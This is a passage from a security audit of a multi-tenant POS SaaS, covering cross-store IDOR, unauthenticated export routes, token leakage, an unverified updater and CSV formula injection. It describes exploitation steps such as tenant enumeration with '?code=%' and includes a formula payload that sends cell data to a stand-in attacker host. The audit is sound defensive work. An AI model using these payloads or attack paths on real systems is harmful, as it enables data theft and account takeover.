(3) A cashier can apply discounts without `invoices.discount`. StoreSalesInvoiceRequest (POST /api/v1/invoices) authorizes on `invoices.create` or `pos.access`, which the cashier role has. It accepts `discount_type`/`discount_value` and `items.*.discount_amount`. CreateInvoiceDTO forwards `discount_value` to confirmInvoice, which caps it only at the subtotal.
(4) The storekeeper role is broken. It is seeded with `items.create` and `items.edit`, but routes/tenant.php:161-163, StoreItemRequest, UpdateItemRequest and ItemPolicy require `items.manage`. That permission exists only as a plan feature key in PlansAndFeaturesSeeder, not as a Spatie permission. StoreStockTransferRequest requires `stores.manage` or `stores.view`, and `stores.view` is not seeded, so `transfers.create` alone gets a 403. StockTransferPolicy does accept `transfers.create`, but the FormRequest blocks the request first.

Overstated or wrong:
- The /api/v1/pos/checkout discount path does not work. POSInvoiceDTO reads `discount_type`/`discount_value`, which are not in StorePOSInvoiceRequest's rules, so `validated()` drops them. POSInvoiceItemDTO maps only `item_id`, `quantity` and `unit_price`. The `discount_amount` and `items.*.discount` sent on that endpoint are therefore silently discarded. This is a functional bug, not a bypass. The discount bypass is real only on POST /api/v1/invoices.
- InvoiceService.php:379-380 is the update path, not checkout.

Severity is lowered from high to medium because:
- The attacker must be an authenticated insider in the same tenant.
- Every invoice records `user_id` and `unit_price`, so the abuse can be audited after the fact.
- The storekeeper part is a broken-access (denial) problem, not a privilege escalation.

The missing server-side price and discount controls are still a real fraud risk.

### 26. [MEDIUM] IDOR on show/cancel/close by id across stores (invoices, purchases, returns, expenses, transfers, shifts)
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\InvoiceController.php:128`
- **Effort:** M
- **Evidence:** Records are loaded by bare id with no store constraint. GetInvoiceDetailsAction::execute does `Invoice::with([...])->findOrFail($invoiceId)`. Other examples: PurchaseController:114 `Purchase::...->findOrFail($id)`; ReturnController:107; ExpenseController:166/179/201, where update reuses `$expense->store_id`; StockTransferController:121. ShiftController::close (line 128) takes `shift_id` from input, and ShiftController::zReport (line 153) passes $id straight to the action. The policies only check role or permission and never `$model->store_id`. For example, InvoicePolicy::view returns true for anyone with `pos.access`, and ShiftPolicy::close does the same for `pos.sell`.
- **Impact:** Concrete cases: (1) cashier of store 1 calls GET /api/v1/invoices/{id} for store 2's invoices; (2) POST /api/v1/shifts/close with shift_id of store 2's open shift closes another branch's drawer with a fabricated counted-cash value; (3) GET /api/v1/shifts/{id}/z-report reads another branch's Z-report; (4) a user with expenses permission sends PUT/DELETE /api/v1/expenses/{id} on another store's expense; (5) GET /api/v1/purchases/{id} and /transfers/{id} expose supplier costs of other branches. All of this stays inside the same tenant, so this is cross-store, not cross-tenant.
- **Recommendation:** In every policy's view/update/delete/cancel/close method, add `&& $user->canAccessStore($model->store_id)` (for transfers, from_store_id or to_store_id), and call `$this->authorize()` with the loaded model. Alternatively, apply the store global scope so findOrFail fails closed.
- **Verification:** The finding holds up in the code. Store-level access is not enforced anywhere on the /api/v1 routes:

- **Invoices.** InvoiceController::show (line ~121) checks only role or permission (admin, invoices.view or pos.access). It then calls GetInvoiceDetailsAction, which runs `Invoice::with([...])->findOrFail($invoiceId)` with no store filter.
- **Other controllers.** PurchaseController::show (~line 114) does `Purchase::with(...)->findOrFail($id)` the same way. ExpenseController show, update and destroy (~166/179/201) all use bare `Expense::findOrFail($id)`, and update reuses `$expense->store_id`.
- **Shifts.** ShiftController::close takes `shift_id` from the request. CloseShiftAction runs `CashShift::where('status','open')->findOrFail($dto->shift_id)` with no store check. CloseShiftRequest::authorize also checks permission only. zReport passes `$id` straight to the action.
- **Policies.** InvoicePolicy and ShiftPolicy check only role or permission and never look at `$model->store_id`.
- **No guard elsewhere.** No model has a global store scope: Invoice, Purchase, Expense, CashShift and StockTransfer only have local scopes. TenantScope filters by tenant_id only. The StoreScope middleware only sets the session store and is appended to the web group, not the API. The StoreAccess middleware, which does check membership in the `store_user` table, is registered as the alias `store.access` in bootstrap/app.php but is not used on any route. The API group in routes/api.php uses only ResolveApiTenancy and ApiTokenAuth.

The design does intend per-store limits: the `store_user` pivot exists, and StorePolicy checks `$user->stores()` membership. So this is a real authorization gap against stated design, and it includes write actions (closing another branch's shift with a made-up counted-cash value, editing or deleting another store's expense).

**Why I lowered it from high to medium:**
1. It stays inside one tenant, since there is one database per tenant. The attacker has to be an authenticated employee of the same business who already holds the relevant permission.
2. Store isolation is missing across the whole API, not just on these by-id endpoints. The index endpoints (for example InvoiceController::index, PurchaseController::index) accept any `store_id` or `X-Store-Id` from the client without a membership check. So a cashier can already list other branches' records, and the by-id cases add little extra exposure beyond the write actions.

The root cause is systemic: `store.access` is never applied and no policy checks store membership. Fixing individual endpoints one by one would not close it.

### 27. [MEDIUM] web.php print/export routes have no auth and no tenancy (CSV statements, inventory export, item movements, reports print, store switch)
- **Location:** `D:\projects\sroor\backend\routes\web.php:278`
- **Effort:** S
- **Evidence:** According to route:list, these routes carry only `web` middleware: GET customers/{id}/export-csv, suppliers/{id}/export-csv, items/export-csv, items/{id}/export-movements-csv, items/{id}/movements/print, reports/print, and POST store/switch. There is no Authenticate, no tenancy initialisation and no permission check. ExportController uses `Customer::findOrFail($id)` / `Supplier::findOrFail($id)` and dumps the full statement through ExportService. Because tenancy is not initialised, these queries run on the default (central) connection, and central migrations contain no customers, invoices or items tables. Today they most likely return an error, but they are one config change away from an anonymous leak. Examples of that change: someone adds tenancy middleware for 'fixing' the 500, or the central DB still holds legacy single-tenant tables.
- **Impact:** If the central DB holds legacy business tables, or tenancy is later added to these routes without auth, any anonymous visitor can GET /customers/1/export-csv and download complete customer ledgers (invoices, payments, notes), the full inventory valuation and per-item stock movements. POST /store/switch writes an arbitrary store_id into the session with no auth and no membership check. getCurrentStore() then trusts that value for web-session users.
- **Recommendation:** Delete the duplicate web.php definitions. Define these routes only in tenant.php inside `auth` with the matching `can:` middleware (customers.statement, suppliers.statement, items.view, reports.view) plus a store-membership check. Remove /store/switch and /stores/switch closures from web.php; keep only StoreController::switchStore.
- **Verification:** The finding holds up against the code, but the claimed impact is overstated.

What the code confirms:
- backend/routes/web.php:146 (items/{id}/movements/print), :196 (reports/print), :271 (POST store/switch), :277 (POST stores/switch), :291-295 (items/{id}/export-movements-csv, customers/{id}/export-csv, suppliers/{id}/export-csv, items/export-csv, activity-logs/export-csv) have no auth, permission or tenancy middleware. invoices/{id}/print/a4 at :62 has none either.
- bootstrap/app.php only appends StoreScope to the web group. StoreScope does nothing for guests, and it is not an authentication guard.
- Laravel lets a later route with the same method and URI replace an earlier one. routes/tenant.php is registered later, in app->booted. It wraps its routes in web + InitializeTenancyByDomain + auth + can: checks, and it redefines only these overlapping paths: invoices/{id}/print/thermal, daily-journal/print, stores/switch and activity-logs/export-csv.
- tenant.php does not redefine customers/suppliers/items export-csv, items/{id}/export-movements-csv, items/{id}/movements/print, reports/print, store/switch or invoices/{id}/print/a4. Those keep the unauthenticated web.php definitions on every domain, including tenant domains.
- ExportController (app/Http/Controllers/ExportController.php) calls Customer/Supplier/Item::findOrFail with no authorization check. The models set no connection override, so without tenancy the queries run on the default central connection.

Why it is overstated:
- The central migrations in backend/database/migrations are users, cache, jobs, plans, tenants, subscriptions, domains, tokens, permissions, activity_logs, pulse, telescope, impersonation tokens and app_versions. None of them create customers, suppliers, items, invoices or stock_movements.
- Under the current code, an anonymous request therefore hits a missing table and returns a 500 error, not tenant data.
- The leak needs one of two conditions. Either the production central database still holds legacy single-tenant tables, which the code cannot confirm (restore_sroor_db.py hints a legacy DB existed), or someone adds tenancy middleware to these routes without auth.
- POST store/switch only writes into the caller's own session, and CSRF applies. An anonymous attacker gains nothing from it. The real risk is that a logged-in tenant user could set current_store_id to a store they do not belong to. Both StoreScope and User::getCurrentStore check only that the store exists and is_active, not membership. That is a horizontal store-isolation weakness, not an anonymous leak.

Verdict: this is a real latent missing-auth defect on routes that export data and should be fixed. Code alone shows no anonymous cross-tenant data exposure today, so I lowered it from high to medium.

### 28. [MEDIUM] Desktop runtime Electron 33 is end-of-life and flagged by npm audit while it renders remote content
- **Location:** `D:\projects\sroor\desktop\package.json:21`
- **Effort:** M
- **Evidence:** "electron": "^33.2.1". npm audit in desktop/ reported 23 vulnerabilities (1 critical, 17 high), including electron <=41.10.5 (ASAR integrity bypass, plus outdated Chromium) and node-tar path traversal in electron-builder's toolchain. main.js loads https://<tenant>.baraa-solutions.com into the BrowserWindow.
- **Impact:** Known Chromium renderer bugs are reachable by any content loaded in the window. Because of the preload bridge and updater IPC described above, a renderer compromise leads to code execution on POS machines. The build toolchain bugs affect the release machine.
- **Recommendation:** Upgrade to a supported Electron major and electron-builder 26.x. Enable sandbox: true explicitly. Add a CSP to the remote app and track Electron security releases in CI with npm audit.
- **Verification:** The finding is real, but its severity is overstated.

What I checked:
- desktop/package.json:21 declares "electron": "^33.2.1".
- The installed version in desktop/node_modules/electron/package.json is 33.4.11. That is Chromium 130, and the Electron 33 line stopped getting fixes around April 2025. Today is 2026-10, so the runtime is about 18 months behind on Chromium/V8 security fixes, including bugs that were exploited in the wild.
- I re-ran `npm audit` in desktop/. It shows the same counts as claimed: 23 vulnerabilities (1 critical, 17 high, 5 moderate). The critical one is node-tar <=7.5.20, which reaches the project through @electron/rebuild, node-gyp and cacache, all part of electron-builder's toolchain.
- desktop/main.js loads remote content: getTargetAppUrl() returns `https://<tenant>.baraa-solutions.com/login` or `/connect`. The window has a preload bridge with contextIsolation:true and nodeIntegration:false. sandbox is not set explicitly, so the Electron 20+ default sandbox applies.
- Nothing limits what the window can load or open. The `will-navigate` handler is empty ("Allow internal navigation"), and I found no setWindowOpenHandler. Any origin the window reaches gets the preload's `window.electronAPI`.

Why I lowered the severity:
1. An old renderer only matters if attacker content gets into the window. That needs XSS on a tenant site, a hostile link it navigates to, or a change to serverUrl through `config:save-settings`. The tenant SPA itself is first-party.
2. The claimed chain from a compromised renderer to code execution does not need a Chromium bug. `ipcMain.handle('updater:download-and-install')` in main.js accepts any `data.downloadUrl` from the renderer and passes it to nativeUpdater.downloadAndApplyUpdate, which uses child_process spawn. Plain XSS in the page can already do that. The real root cause is the unrestricted updater IPC plus the lack of navigation restriction. The outdated Electron only adds to that risk; it is not the main path.
3. The ASAR integrity bypass needs local write access to the install directory.
4. The node-tar path-traversal issues hit only the build/release machine, and only when it extracts untrusted tarballs during an install. They do not ship to POS machines.

Conclusion: it is a real, verified supply-chain and patching-hygiene issue and should be fixed by upgrading to a supported Electron and electron-builder. On its own it is medium. The high or critical risk sits with the separate findings about the updater IPC and navigation in D:\projects\sroor\desktop\main.js and D:\projects\sroor\desktop\src\updater\nativeUpdater.js.

### 29. [MEDIUM] Capacitor shell loads one hardcoded tenant host with cleartext enabled, on a @capacitor/android version with a critical advisory
- **Location:** `D:\projects\sroor\backend\capacitor.config.json:7`
- **Effort:** M
- **Evidence:** server.url = https://2m.baraa-solutions.com and server.cleartext = true. res/xml/config.xml has <access origin="*" />. AndroidManifest has allowBackup="true" and REQUEST_INSTALL_PACKAGES. npm audit --omit=dev in backend/ reports @capacitor/android 8.5.0 as critical (GHSA-rvm3-566m-v7fv, remote content can be loaded at the app origin via the internal HTTP proxy path; fixed in 8.5.1). Overall: 10 vulnerabilities (1 critical, 6 high).
- **Impact:** The native bridge (Camera, App, NativeBiometric credentials) is exposed to whatever the remote origin serves, so any XSS on 2m.baraa-solutions.com becomes native-plugin access and can read biometric-stored credentials. Cleartext lets http subresources and redirects load in the WebView. All Android installs are pinned to one tenant's host, which is wrong for a generic SaaS and couples every customer to that tenant's origin. With allowBackup, the localStorage bearer token can be extracted over adb backup.
- **Recommendation:** Bump @capacitor/* to at least 8.5.1. Set cleartext: false and add a network_security_config with cleartextTrafficPermitted=false. Restrict server.allowNavigation to *.baraa-solutions.com, or better, ship bundled web assets and call the API by tenant. Set android:allowBackup="false" (or add backup rules that exclude WebView storage). Make the host tenant-configurable rather than hardcoding 2m.
- **Verification:** The configuration facts check out in the code, but the impact claimed is conditional and partly overstated.

**Confirmed:**
- **Remote server URL with cleartext on.** `backend/capacitor.config.json:7-8` sets `server.url` to `https://2m.baraa-solutions.com` and `cleartext: true`. The same values are in `android/app/src/main/assets/capacitor.config.json`, so they ship in the APK.
- **The pinned host is a tenant, not the central domain.** `config/tenancy.php:19-25` lists `baraa-solutions.com` and `www.baraa-solutions.com` as central domains, so `2m.` is a tenant subdomain. Every Android install is tied to that one tenant, which is a real multi-tenant SaaS defect.
- **Wildcard access.** `res/xml/config.xml` has `<access origin="*" />`.
- **Backup and install permissions.** `AndroidManifest.xml:5` has `allowBackup="true"` and line 47 has `REQUEST_INSTALL_PACKAGES`.
- **Plugin version.** The installed `@capacitor/android` is 8.5.0 (checked in `node_modules/.../package.json`).
- **Biometric plugin stores the real password.** `@capgo/capacitor-native-biometric` is wired into the Android build. `resources/js/Composables/useBiometricAuth.js` calls `setCredentials` with the user's actual login and password.
- **Token in localStorage.** `resources/js/stores/auth.js:55` and `:91` store the bearer token in `localStorage`.

**Overstated:**
1. **Native-bridge exposure needs XSS first.** It only matters if there is an XSS or a compromise on the tenant origin. Using a remote `server.url` means trusting the app's own server, which is normal for this design; it is not an exploitable hole by itself.
2. **Cleartext does little here.** The URL is https, and nothing in the config or the Android Java sources enables a mixed-content mode, so the WebView keeps blocking http subresources by default. The main effect of `cleartext` is allowing cleartext network traffic and redirects.
3. **adb backup only works on older Android.** `targetSdkVersion` is 34, and on Android 12+ adb backup leaves out app data for apps targeting 31+ unless they are debuggable. Extraction is still possible on Android 7-11 (`minSdk` is 24) and possibly through cloud auto-backup, but it needs physical access or the user's account.
4. **Advisory not checked offline.** I did not run `npm audit` because the task forbids network or server calls, so GHSA-rvm3-566m-v7fv and the 8.5.1 fix are unconfirmed here. Only the 8.5.0 version is confirmed.
5. **`REQUEST_INSTALL_PACKAGES` is not a direct vulnerability.** It is a Play policy and attack-surface concern.

**Net:** a real hardening and multi-tenant design defect, not an exploitable high on its own. The serious outcomes need an XSS or physical access first, so medium fits better than high.

### 30. [MEDIUM] Tenant workspace resolver is unauthenticated, unthrottled and LIKE-injectable, so tenants can be enumerated
- **Location:** `D:\projects\sroor\backend\app\Actions\Tenants\ResolveTenantWorkspaceAction.php:33`
- **Effort:** S
- **Evidence:** GET /api/v1/central/tenants/resolve and the /api/central/tenants/resolve alias (routes/api.php:22,226) are public, and no throttle middleware exists anywhere in routes/ or bootstrap/app.php. The query uses ->orWhere('domain','like', "{$code}.%") with the user-supplied code. sanitizeCode() does not escape % or _. A match returns tenant_id, name, slug, domain and status, including for suspended tenants.
- **Impact:** An attacker sends ?code=% to get the first tenant, then ?code=a%, ?code=b% and so on to enumerate every customer of the SaaS. Combined with quick-login, that list becomes a list of takeover targets. It is also competitive intelligence (customer list).
- **Recommendation:** Escape LIKE wildcards (or use exact matches only), require a minimum code length, add RateLimiter throttling (e.g. 10/min per IP) on resolve, login and every guest auth route, and return minimal data.

### 31. [MEDIUM] Telescope stores Authorization headers of failed requests centrally, and its gate/bridge admit any 'admin' role or any @baraa-solutions.com email
- **Location:** `D:\projects\sroor\backend\app\Providers\TelescopeServiceProvider.php:45`
- **Effort:** S
- **Evidence:** hideRequestHeaders hides only cookie, x-csrf-token and x-xsrf-token. 'authorization' and 'x-api-token' are not hidden, and Telescope records every failed request (filter at line 24-31). The viewTelescope gate (line 59-87) logs in through ?token=, accepts plaintext api_token, and allows hasRole('admin') plus the hardcoded phones/emails. routes/web.php:36-43 additionally allows str_ends_with(email, '@baraa-solutions.com') and calls auth('web')->login($user, true), which creates a remember-me session.
- **Impact:** Every 401/403/422 response from any tenant stores that user's bearer token in the central telescope_entries table. A central user who reaches /telescope (any central 'admin', or a token obtained via quick-login) can harvest live tenant tokens and request payloads.
- **Recommendation:** Add 'authorization' and 'x-api-token' to hideRequestHeaders and 'api_token' and 'token' to hideRequestParameters. Remove the token-in-URL bridge. Restrict the gate to a pinned CentralUser with the super_admin role, without remember-me. Disable Telescope in production or sample it.

### 32. [MEDIUM] X-Store-Id is trusted without a membership check, and API routes have no store.access middleware
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:83`
- **Effort:** S
- **Evidence:** Lines 83-86 copy any numeric X-Store-Id into session('current_store_id'). User::getCurrentStore() (User.php) returns Store::find(session id) if the store is active, without checking $this->stores. ApiMeAction.php:24-27 does the same. routes/api.php applies only ResolveApiTenancy and ApiTokenAuth; StoreScope/StoreAccess are registered only for the web group (bootstrap/app.php:19-21,27-28).
- **Impact:** A cashier assigned to branch 2 sends X-Store-Id: 1 and operates or reads the main branch: shifts, POS, stock and daily journal, for any endpoint that resolves the store through getCurrentStore(). This is within the tenant, so it is cross-store, not cross-tenant.
- **Recommendation:** In ApiTokenAuth (or a dedicated API StoreAccess middleware applied to the protected group), reject X-Store-Id unless the user is admin or $user->stores()->whereKey($id)->exists(). Make getCurrentStore() enforce the same check.

### 33. [MEDIUM] Super-admin FormRequests authorize tenant 'admin' (and some return true), so the route `can:` middleware is the only barrier
- **Location:** `D:\projects\sroor\backend\app\Http\Requests\UpdateTenantDatabaseConfigRequest.php:13`
- **Effort:** S
- **Evidence:** UpdateTenantDatabaseConfigRequest, UpdateTenantUnitsRequest, UpdatePlatformSettingsRequest and UpdateSystemUnitsRequest all accept `hasRole('admin')`. ToggleTenantStatusRequest and OverrideTenantFeatureRequest accept `hasRole('admin')` plus the hardcoded phones. StoreTenantRequest.php:11 and UpdatePlanRequest.php:11 `return true`. ImpersonateTenantRequest.php:13 accepts `hasRole('admin')`. Every tenant owner holds 'admin'. runTenantMigrations and destroyTenant have no FormRequest at all. TenantPolicy exists but is never called.
- **Impact:** Today `can:super_admin.access` on api.php:196 blocks plain tenant admins, because Gate::before returns false for super_admin.*. But if that middleware is ever dropped, or a route is duplicated or moved (routes are already duplicated across api.php and tenant.php), every tenant admin immediately gets full platform control. There is no second line of defence.
- **Recommendation:** Make each super-admin FormRequest's authorize() call one shared central super-admin check, and call `$this->authorize(...)` through TenantPolicy in SuperAdminApiController, including destroyTenant and runTenantMigrations. Never accept the tenant-level 'admin' role there.

### 34. [MEDIUM] Store stock (with cost_price and valuation) and store details are readable for any store without permission
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\StoreController.php:193`
- **Effort:** S
- **Evidence:** StoreController::stocks takes `store_id` from the query or X-Store-Id (default 1) and has no permission or store-access check. StoreStockResource.php:15-26 returns cost_price and total valuation. StoreController::show (line 107) has no check either, and returns any store together with its assigned users' names and emails. In api.php:49-53 neither route has `can:` middleware. The seeded permission items.view_cost is never enforced anywhere; it only appears in GetPermissionsTreeAction.
- **Impact:** A cashier lists GET /api/v1/stores/stocks?store_id=N for every N and gets the purchase cost and stock valuation of every branch. They can also enumerate staff emails per store through /stores/{id}.
- **Recommendation:** Require items.view (or pos.access) plus store access on stocks, and stores.manage or assignment on show. Strip cost_price and valuation unless the user has items.view_cost.

### 35. [MEDIUM] roles.manage is unbounded: no role hierarchy, users can edit themselves, no last-admin protection
- **Location:** `D:\projects\sroor\backend\app\Actions\Users\UpdateUserAction.php:19`
- **Effort:** M
- **Evidence:** UpdateUserRequest authorizes admin, users.manage or roles.manage, and accepts any role, password and is_active for any user id, including the caller and admins. UpdateUserAction applies password, is_active and syncRoles with no check for self-edit or a target with a higher role. UpdateRolePermissionsAction.php:18-24 lets a roles.manage holder sync any permission set onto any role, including their own role and the super_admin role. DeleteUserAction and ToggleUserActiveAction block only self, not 'last admin'. Through update, a user can also set is_active=false or demote their own account.
- **Impact:** An accountant given a custom role with roles.manage (for example to manage cashiers) sends PUT /users/{self} role=admin, or resets the owner's password through PUT /users/{ownerId}, and takes over the tenant. An admin can delete or demote every other admin and then demote themselves, locking the tenant out and creating support tickets.
- **Recommendation:** Introduce a rank or hierarchy: users can only assign roles at or below their own and cannot modify users of a higher rank. Forbid changing your own role or is_active. Require admin, not roles.manage, to change another user's password. Block removing, deactivating or demoting the last active admin. Never allow editing the admin or super_admin role definitions through the API.

### 36. [MEDIUM] Tenant API routes lack route-level permission middleware; authorization depends on per-controller ad-hoc checks
- **Location:** `D:\projects\sroor\backend\routes\api.php:45`
- **Effort:** M
- **Evidence:** In route:list, every api/v1 operational route except activity-logs has only `api, ResolveApiTenancy, ApiTokenAuth`. That covers customers, suppliers, items, invoices, payments, shifts, expenses, reports, users, roles, settings and trash. In contrast, tenant.php applies `can:` to the equivalent web routes. Authorization is left to each controller. DashboardApiController::index only checks `$user` exists. StoreSalesInvoiceRequest::authorize ends with `?? true`. PaymentController and DailyJournalController have zero or one checks.
- **Impact:** Any authenticated user (for example a driver role with minimal permissions) can reach /api/v1/dashboard and read sales, profit and treasury metrics for any store via X-Store-Id. This pattern fails open: a forgotten check in one controller method means silent exposure.
- **Recommendation:** Add `can:<permission>` middleware per route group in api.php, mirroring tenant.php, and keep policies as a second layer. Add an architecture test that fails if any api/v1 route outside an explicit public allow-list lacks an Authorize middleware.

### 37. [MEDIUM] Daily-journal print (web.php) is unauthenticated and its store_id filter is user-tamperable everywhere
- **Location:** `D:\projects\sroor\backend\routes\web.php:68`
- **Effort:** S
- **Evidence:** web.php:68-127 has no auth and takes `store_id` from the query string, defaulting to 'all'. Customer and supplier Payment queries (lines 93, 102) ignore the store filter entirely. On tenant domains the tenant.php:97 copy wins and is behind `auth` + `can:daily_journal.view`, but it applies the same unvalidated `store_id`/'all'. The tenant.php copy of items/{id}/movements is protected, while web.php:130 items/{id}/movements/print is not.
- **Impact:** A user with daily_journal.view at store 1 requests /daily-journal/print?store_id=all, or store_id=2, and receives every branch's sales, expenses, supplier payments and shift opening cash. Payments are always aggregated across all stores, so even per-store prints mix in other branches' collections, which is also a correctness bug in cash reconciliation.
- **Recommendation:** Resolve store_id through the same StoreContext validation. Only allow 'all' for users with an explicit all-stores permission. Filter Payment queries by store_id. Remove the web.php duplicate.

### 38. [MEDIUM] CSV/Excel formula injection in ExportService and activity-log export
- **Location:** `D:\projects\sroor\backend\app\Services\ExportService.php:32`
- **Effort:** S
- **Evidence:** streamCsv writes rows with plain `fputcsv($handle, $row)`, with no sanitising of leading = + - @ \t \r. The rows include user-controlled text such as invoice notes, payment notes and return notes (ExportService.php:66-90), plus customer, supplier and item names. ExportActivityLogsCsvAction.php:80-89 writes `$log->description` and the IP the same way. The UTF-8 BOM is added specifically so Excel opens these files.
- **Impact:** A cashier or POS user saves an invoice or payment with notes like `=HYPERLINK("http://attacker/?d="&A1,"click")` or a DDE payload. When the owner or accountant exports the customer statement and opens it in Excel, the formula runs. This allows data exfiltration or, on older Excel/LibreOffice setups, command execution on the admin's machine.
- **Recommendation:** In streamCsv and the activity-log writer, prefix any string cell starting with =, +, -, @, tab or CR with a single quote. Leave numeric columns as numbers. Add a unit test.

### 39. [MEDIUM] Stock transfers and stock adjustments accept any store id without checking the user's branch
- **Location:** `D:\projects\sroor\backend\app\Http\Requests\StoreStockTransferRequest.php:13`
- **Effort:** S
- **Evidence:** authorize() allows any user with `stores.view`, a read permission, to create transfers. from_store_id and to_store_id are only validated with `exists:stores,id`. AdjustStockRequest.php:19 accepts any `store_id` with `exists:stores,id` for users with items.manage.
- **Impact:** A branch user with stores.view creates a transfer moving stock out of another branch they are not assigned to. A user with items.manage records waste_out or adjustment_out on another branch's stock. Either way, inventory is silently shrunk where they have no accountability.
- **Recommendation:** Require `transfers.create`/`stores.manage` (not stores.view). Validate from_store_id (and adjustment store_id) against the user's accessible stores.

### 40. [MEDIUM] Bearer tokens accepted from ?api_token= and stored/compared in plaintext; Sanctum tokens never expire
- **Location:** `D:/projects/sroor/backend/app/Http/Middleware/ApiTokenAuth.php:21`
- **Effort:** M
- **Evidence:** ApiTokenAuth.php:21 takes the token from bearerToken() ?: X-API-TOKEN ?: query('api_token'). Lines 43-47 fall back to User::where('api_token',$token) (plaintext column). ApiQuickLoginAction persists the full plainTextToken into users.api_token. The vendor sanctum config default 'expiration' => null applies because backend/config/sanctum.php is absent. Telescope only adds '_token' to hidden params (TelescopeServiceProvider:43); the Telescope defaults hide password/password_confirmation and the authorization header, but not the api_token or token query params, and not response bodies (login responses contain plainTextToken). With APP_ENV=local every request is recorded (filter at line 25).
- **Impact:** Any DB read (backup, SQL dump such as the ones in backups/, SQLi, Telescope query watcher) yields directly usable, non-expiring tokens. Query-string tokens leak through access logs, Referer and Telescope. A stolen token remains valid indefinitely.
- **Recommendation:** Drop the api_token column fallback and the query-string source. Rely on Sanctum's hashed personal_access_tokens only. Publish config/sanctum.php with a finite expiration (and prune expired tokens on a schedule). Add Telescope::hideRequestParameters(['password','token','api_token']) and hideResponseParameters(['data.token','token']), and keep Telescope off in production.

### 41. [MEDIUM] No rate limiting on public resolver, quick-login, workspace-users, app-update, or the authenticated Telegram test endpoint
- **Location:** `D:/projects/sroor/backend/routes/api.php:22`
- **Effort:** S
- **Evidence:** No 'throttle' middleware or RateLimiter::for() exists anywhere under routes/, bootstrap/ or app/Providers. bootstrap/app.php does not call throttleApi(), so the Laravel 11+ api group has no default limiter. Only /auth/login is limited, via ApiLoginRequest::ensureIsNotRateLimited (6 attempts per login|ip, 60s decay; AuthController.php:32). /central/tenants/resolve (api.php:22 and the alias at 226), /auth/quick-login, /auth/workspace-users, /app/download-apk and /settings/telegram/test (api.php:188, no can: middleware) are unthrottled.
- **Impact:** Tenant slug enumeration via the resolver feeds the quick-login takeover. APK download endpoints can be abused for bandwidth. Any authenticated tenant user can spam the tenant's Telegram bot via the test endpoint. The login throttle key includes the identifier, so credential stuffing across many accounts from one IP is limited only per account.
- **Recommendation:** Define named limiters in AppServiceProvider (RateLimiter::for('auth'), 'public', 'telegram') and apply throttle:auth to the login endpoints, throttle:public to the resolver/app-update routes, and throttle plus can:settings.manage to the Telegram test. Add a per-IP global limiter on top of the per-identifier login limiter.

### 42. [MEDIUM] Update channel has no integrity verification on any client; checksum is computed but never delivered
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\AppUpdateController.php:46`
- **Effort:** M
- **Evidence:** CreateAppVersionAction computes apk_checksum (sha256), and CheckAppUpdateAction includes 'checksum' in latest_version. AppUpdateController::checkVersion builds its JSON without the checksum field. useAppUpdate.js passes latestVersionData.download_url (or a hardcoded https://2m.baraa-solutions.com/Sroor-ERP-POS-Setup.exe fallback) to Electron, which runs the file without verification. DownloadLatestApkAction falls back to loose files such as public_path('Sroor-ERP-POS-Setup.exe') and base_path('../desktop/dist/...'). Upload (StoreAppVersionRequest) is gated by can('system.manage') with only 'file|max:153600' and no mime/extension check. The server does assign the filename. The positive side: there is no admin- or tenant-supplied download URL, because download_url is server-generated from a route.
- **Impact:** Anyone who can publish a release (including a tenant user who escalated via the phone allow-list) or who can drop a file into public/ ships an EXE that every desktop client installs silently with /S. Android is partly protected because package signature checks block same-package updates with a different key.
- **Recommendation:** Return the checksum and a detached signature in check-update. Have Electron's main process verify the SHA-256 and Authenticode publisher before spawn. Gate publishing on a central super-admin guard rather than 'system.manage'. Remove the public_path/base_path fallback binaries. Validate extension and mimetype per platform.

### 43. [MEDIUM] Bearer token stored in localStorage and placed in a URL for the Telescope bridge
- **Location:** `D:\projects\sroor\backend\resources\js\Layouts\SuperAdminLayout.vue:33`
- **Effort:** S
- **Evidence:** stores/auth.js:55/91 calls localStorage.setItem('auth_token', ...). Services/api.js:19-33 attaches Authorization from localStorage, along with X-Store-Id (current_store_id) and X-Tenant (tenant_id), both read from user-editable localStorage. SuperAdminLayout.vue:31-34 builds `/telescope-access?token=${encodeURIComponent(token)}` with the super-admin's API bearer token. No sanctum config is present (config/sanctum.php is missing), so token expiration is null.
- **Impact:** A super-admin's never-expiring platform token ends up in browser history, server and proxy access logs, and Referer headers. Anyone with log access can replay it against /api/v1/super-admin/*. The localStorage token gives any XSS full account takeover; this is accepted for Capacitor/Electron but makes the XSS-to-RCE chain above more dangerous. X-Store-Id and X-Tenant come from client storage, so server-side validation is the only control (covered by the access-control sub-area).
- **Recommendation:** Replace the URL token with a short-lived, single-use, POST-exchanged ticket (or a signed URL valid for 60 seconds) that maps to a Telescope session. Publish config/sanctum.php with an expiration and prune expired tokens. On native shells, consider Capacitor secure storage for the token.

### 44. [MEDIUM] Telegram bot token stored in plaintext and returned to the frontend; tenant notifications fall back to the platform's bot and chat
- **Location:** `D:\projects\sroor\backend\app\Services\TelegramService.php:22`
- **Effort:** S
- **Evidence:** SettingController::index (line 51) returns 'telegram_bot_token' => Setting::get(...) in clear text. UpdateSettingsAction returns Setting::allCached(), which includes the token, on every save. Setting::set stores the value unencrypted. getBotToken() returns Setting::get('telegram_bot_token') ?: config('services.telegram.bot_token'), and getDefaultChatId() falls back the same way. config/services.php reads both from env (no hardcoded value). In api.php:186-188 the settings routes have no can: middleware, though the controller and FormRequest check admin, roles.manage or settings.manage.
- **Impact:** A tenant that hasn't configured Telegram has its business notifications (sales, low stock, shifts) sent to the platform operator's Telegram chat using the platform bot, so tenant data leaves its boundary. A tenant admin can also make the platform bot spam the operator's chat via /settings/telegram/test. Any user holding settings.manage can read the tenant's bot token in full, and it appears in browser and devtools caches.
- **Recommendation:** Store the bot token with the Laravel encrypted cast or Crypt. Return it masked (for example last 4 characters) and accept a write-only field on update. Remove the config() fallback when tenancy is initialized, so tenants without their own token and chat get no notifications. Add can:settings.manage on the api.php routes to match tenant.php.

### 45. [LOW] Unknown hosts and central-host requests without a tenant header run the full tenant API against the central DB, and central guards are fed tenant-model users
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ResolveApiTenancy.php:55`
- **Effort:** M
